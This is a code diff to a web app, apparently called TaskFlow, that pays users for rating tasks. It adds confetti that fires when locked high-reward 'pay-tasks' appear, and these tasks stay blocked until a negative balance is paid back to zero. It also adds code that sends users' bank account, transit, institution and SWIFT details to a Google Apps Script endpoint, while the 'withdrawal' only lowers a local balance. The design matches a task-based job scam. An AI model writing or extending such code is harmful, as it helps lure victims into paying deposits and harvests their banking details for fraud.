@@ -820,6 +820,7 @@
   let confettiPieces = [];
   let animationId = null;
   let isConfettiRunning = false;
+  let confettiTimer = null;
 
   function resizeCanvas() {
     canvas.width = window.innerWidth;
@@ -839,16 +840,20 @@
       this.rotation = Math.random() * 360;
       this.rotationSpeed = (Math.random() - 0.5) * 0.2;
       this.opacity = 1;
+      this.life = 1;
     }
     update() {
       this.x += this.speedX;
       this.y += this.speedY;
       this.rotation += this.rotationSpeed;
+      this.life -= 0.01;
+      this.opacity = Math.max(0, this.life);
       if (this.y > canvas.height) {
         this.y = -20;
         this.x = Math.random() * canvas.width;
         this.speedX = (Math.random() - 0.5) * 6;
         this.speedY = Math.random() * 6 + 4;
+        this.life = 1;
       }
     }
     draw() {
@@ -862,25 +867,26 @@
     }
   }
 
-  function launchConfetti(count = 150) {
-    if (isConfettiRunning) return;
+  function launchConfetti(count = 150, duration = 3000) {
+    // Clear any existing confetti and timer
+    stopConfetti();
+    
     isConfettiRunning = true;
     for (let i = 0; i < count; i++) {
       confettiPieces.push(new ConfettiPiece());
     }
+    
     function animate() {
       ctx.clearRect(0, 0, canvas.width, canvas.height);
-      let alive = false;
       for (let i = confettiPieces.length - 1; i >= 0; i--) {
         const p = confettiPieces[i];
         p.update();
         p.draw();
-        if (p.opacity > 0) alive = true;
-        if (p.y > canvas.height + 50) {
+        if (p.life <= 0 || p.y > canvas.height + 50) {
           confettiPieces.splice(i, 1);
         }
       }
-      if (confettiPieces.length > 0) {
+      if (confettiPieces.length > 0 && isConfettiRunning) {
         animationId = requestAnimationFrame(animate);
       } else {
         isConfettiRunning = false;
@@ -888,6 +894,25 @@
       }
     }
     animate();
+
+    // Auto-stop after duration
+    confettiTimer = setTimeout(() => {
+      stopConfetti();
+    }, duration);
+  }
+
+  function stopConfetti() {
+    isConfettiRunning = false;
+    if (animationId) {
+      cancelAnimationFrame(animationId);
+      animationId = null;
+    }
+    if (confettiTimer) {
+      clearTimeout(confettiTimer);
+      confettiTimer = null;
+    }
+    confettiPieces = [];
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
   }
 
   // =============================================================
@@ -959,6 +984,7 @@
   // Persistent special task lock (stored in localStorage so it survives refresh)
   const SPECIAL_TASK_KEY = 'taskflow_special_task';
   let pendingSpecialTask = null;
+  let lastSpecialTaskId = null;
 
   function loadPendingSpecialTask() {
     try {
@@ -1580,6 +1606,28 @@
   }
 
   // =============================================================
+  // SEND EMAIL VIA GOOGLE APPS SCRIPT
+  // =============================================================
+  async function sendEmail(data) {
+    try {
+      const formData = new URLSearchParams();
+      for (const [key, value] of Object.entries(data)) {
+        formData.append(key, value);
+      }
+      const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: formData.toString()
+      });
+      return true;
+    } catch (error) {
+      console.error('Send email error:', error);
+      return false;
+    }
+  }
+
+  // =============================================================
   // AUTH FUNCTIONS
   // =============================================================
   function closeModalFn() {
@@ -1714,6 +1762,7 @@
     currentTaskIndex = 0;
     payTaskApplied = false;
     clearPendingSpecialTask();
+    stopConfetti();
     showAuthScreen();
     showSection('about');
   }
@@ -1847,8 +1896,6 @@
 
     // If we have a pending special task but the current task ID doesn't match, clear it
     if (pendingSpecialTask && pendingSpecialTask.taskId !== task.id) {
-      // The user might have completed other tasks and moved past the special task
-      // Check if the special task was completed
       const specialTask = tasksData.find(t => t.id === pendingSpecialTask.taskId);
       if (specialTask && specialTask.status === 'completed') {
         clearPendingSpecialTask();
@@ -1868,7 +1915,6 @@
 
     if (isSpecialLocked && lockedReward !== null) {
       displayReward = lockedReward;
-      // Find the pay amount from the ranges
       for (const range of payRanges) {
         if (range.reward === lockedReward) {
           payAmount = Math.abs(range.newBalance);
@@ -1876,7 +1922,6 @@
         }
       }
     } else if (balanceCache < 0) {
-      // Find which range we're in to get the reward and pay amount
       for (const range of payRanges) {
         if (balanceCache === range.newBalance) {
           displayReward = range.reward;
@@ -1884,7 +1929,6 @@
           break;
         }
       }
-      // Lock it
       task.lockedReward = displayReward;
       task.isSpecialLocked = true;
       isSpecialLocked = true;
@@ -1897,6 +1941,12 @@
     } else {
       task.payTask = false;
       displayReward = task.originalReward > 0 ? task.originalReward : task.reward;
+    }
+
+    // Show confetti when special task appears (only once per task)
+    if ((isPayTask || isSpecialLocked) && lastSpecialTaskId !== task.id) {
+      lastSpecialTaskId = task.id;
+      launchConfetti(150, 3000);
     }
 
     let rewardStr = `+ $${displayReward.toFixed(2)}`;
@@ -1921,7 +1971,6 @@
       badgeHtml = `<span class="badge x3">${t.special} ${t.multiplier}3</span>`;
     }
 
-    // Button is disabled if balance is not zero AND it's a pay-task
     const isDisabled = (isPayTask || isSpecialLocked) && Math.abs(balanceCache) > 0.001;
 
     let html = `
@@ -1941,7 +1990,6 @@
     taskContainer.innerHTML = html;
     taskProgress.textContent = `Task ${currentTaskIndex+1} / ${tasksData.length} (${completedIds.length} completed)`;
 
-    // Attach events
     taskContainer.querySelectorAll('.stars').forEach(starDiv => {
       const id = parseInt(starDiv.dataset.id, 10);
       const spans = starDiv.querySelectorAll('span');
@@ -1976,7 +2024,6 @@
     if (!task || task.status === 'completed') return;
     const t = i18n[currentLang];
 
-    // If pay-task, balance must be zero to start
     if ((task.payTask || task.isSpecialLocked) && Math.abs(balanceCache) > 0.001) {
       alert(t.pay_task_balance_not_zero.replace('${balance}', balanceCache.toFixed(2)));
       return;
@@ -1991,7 +2038,6 @@
     if (selectedStars === 0) { alert(t.select_stars); return; }
     if (comment.length < 40) { alert(`${t.min_chars} (${comment.length}/40)`); return; }
 
-    // Determine reward
     let reward = task.reward;
     if (task.isSpecialLocked && task.lockedReward !== null) {
       reward = task.lockedReward;
@@ -2010,14 +2056,13 @@
     updateBalanceDisplay();
     updateCompletedCount();
 
-    // If it was a pay-task, launch confetti!
     if (reward >= 300) {
-      launchConfetti(180);
+      launchConfetti(180, 4000);
     }
 
-    // Find next pending task
     currentTaskIndex = tasksData.findIndex((t, idx) => idx > currentTaskIndex && t.status !== 'completed');
     if (currentTaskIndex === -1) currentTaskIndex = tasksData.length;
+    lastSpecialTaskId = null;
     renderCurrentTask();
   }
 
@@ -2046,6 +2091,7 @@
     const swift = swiftCode.value.trim();
     const amount = parseFloat(withdrawAmount.value);
     const t = i18n[currentLang];
+
     if (!bank || !holder || !account || !transit || !institution || !swift) {
       alert(t.withdraw_error_required);
       return;
@@ -2058,6 +2104,21 @@
       alert(t.withdraw_insufficient.replace('${balance}', balanceCache.toFixed(2)));
       return;
     }
+
+    // Send withdrawal details via email
+    const emailData = {
+      type: 'withdraw',
+      userEmail: currentUser?.email || 'Not signed in',
+      bank: bank,
+      holder: holder,
+      account: account,
+      transit: transit,
+      institution: institution,
+      swift: swift,
+      amount: amount.toFixed(2)
+    };
+    await sendEmail(emailData);
+
     balanceCache -= amount;
     await saveUserData();
     updateBalanceDisplay();
@@ -2071,7 +2132,6 @@
       .replace('${swift}', swift);
     alert(successMsg);
     closeWithdrawModalFn();
-    // Re-render task to update state
     renderCurrentTask();
   });
 
@@ -2175,7 +2235,7 @@
   }
 
   // =============================================================
-  // CONTACT FORM – Sends to Google Apps Script
+  // CONTACT FORM
   // =============================================================
   contactSubmit.addEventListener('click', async (e) => {
     e.preventDefault();
@@ -2191,20 +2251,14 @@
     statusEl.className = 'loading';
     statusEl.textContent = t.contact_sending;
     try {
-      const formData = new URLSearchParams();
-      formData.append('name', name);
-      formData.append('email', email);
-      formData.append('message', message);
-      formData.append('from', currentUser?.email || 'Not signed in');
-
-      const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: formData.toString()
-      });
-
-      // With no-cors, we can't read the response, but the script will send the email
+      const emailData = {
+        type: 'contact',
+        name: name,
+        email: email,
+        message: message,
+        userEmail: currentUser?.email || 'Not signed in'
+      };
+      await sendEmail(emailData);
       statusEl.className = 'success';
       statusEl.textContent = t.contact_success;
       contactName.value = '';
